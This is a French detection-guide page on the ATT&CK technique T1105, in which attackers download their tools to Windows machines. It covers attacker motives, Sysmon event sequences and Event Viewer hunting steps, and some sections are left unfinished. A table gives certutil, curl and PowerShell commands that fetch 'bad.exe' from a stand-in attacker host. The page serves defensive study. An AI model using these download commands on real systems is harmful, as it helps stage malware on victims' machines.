---
title: "Téléchargement d'outils"
description: "Une fois entré, l'attaquant télécharge sur la machine les outils de la suite (implant de C2, scripts, voleurs de mots de passe, rançongiciel) avec des commandes intégrées à Windows."
tags: [windows, sysmon, certutil, curl, powershell]
updated: 2026-11-18
draft: false
type: technique
attack_id: T1105
tactic: command-and-control
severity: high
platforms: [Windows]
data_sources: [Sysmon]
related:
  - 03-menaces-detection/initial-access/piece-jointe-malveillante
---

## Description

Une attaque commence avec presque rien : une petite pièce jointe, ou une session RDP sans outils. L'attaquant télécharge ensuite ce dont il a besoin : un script de découverte (Seatbelt), un extracteur de mots de passe (Mimikatz), un RAT (Remcos), et en fin de course le rançongiciel. Découper l'attaque en plusieurs fichiers aide à passer l'antivirus et expose moins ses outils s'il est repéré tôt.

Le premier téléchargement est souvent l'**implant de commande et contrôle** (C2) : la pièce jointe le récupère, le cache dans un dossier comme `C:\Temp` et le lance comme un processus à part, qui se connecte à l'attaquant et attend ses ordres. L'attaque continue même si l'utilisateur supprime la pièce jointe. Après une intrusion par RDP, l'attaquant pourrait taper ses commandes dans la session, mais il installe le plus souvent un C2 quand même, pour ne pas perdre l'accès si le RDP est fermé.

| Méthode | Commande |
| --- | --- |
| certutil | `certutil.exe -urlcache -f https://blackhat.thm/bad.exe good.exe` |
| curl | `curl.exe https://blackhat.thm/bad.exe -o good.exe` (Windows 10 et suivants) |
| PowerShell | `powershell -c "Invoke-WebRequest -Uri 'https://blackhat.thm/bad.exe' -OutFile 'good.exe'"` |
| Interface | Copier-coller par la session RDP, ou téléchargement par le navigateur. |

## Ce qu'on observe

L'enchaînement dans Sysmon pour un téléchargement avec curl :

:::etapes
1. **Un interpréteur est lancé**
   Sysmon 1 : `cmd.exe`.
2. **L'outil de téléchargement démarre**
   Sysmon 1 : `curl.exe`, avec l'URL dans la ligne de commande.
3. **Il contacte le serveur**
   Sysmon 22 (requête DNS) et 3 (connexion) depuis `curl.exe`.
4. **Le fichier arrive sur le disque**
   Sysmon 11 : `Image` = `curl.exe`, `TargetFilename` = le fichier téléchargé.
:::

## Détection

### Observateur d'événements

Un téléchargement passe par le réseau : partir des connexions et des requêtes DNS.

:::etapes
1. **Trouver la connexion**
   Journal Sysmon, Filter Current Log sur `3` et `22` : quel processus se connecte, vers quel domaine.
2. **Trouver le fichier**
   Find sur le `ProcessId` de ce processus : le fichier écrit (11), et la ligne de commande qui l'a lancé (1).
3. **Trouver la suite**
   Filtre sur `1`, Find sur le nom du fichier téléchargé : a-t-il été lancé ?
:::

## Faux positifs

À compléter.

:::piege
**Un domaine de confiance n'innocente pas un téléchargement** : les attaquants récupèrent souvent leurs outils sur GitHub ou d'autres services légitimes. Juger le processus qui se connecte, le domaine et le fichier téléchargé.
:::

## Réponse

À compléter.
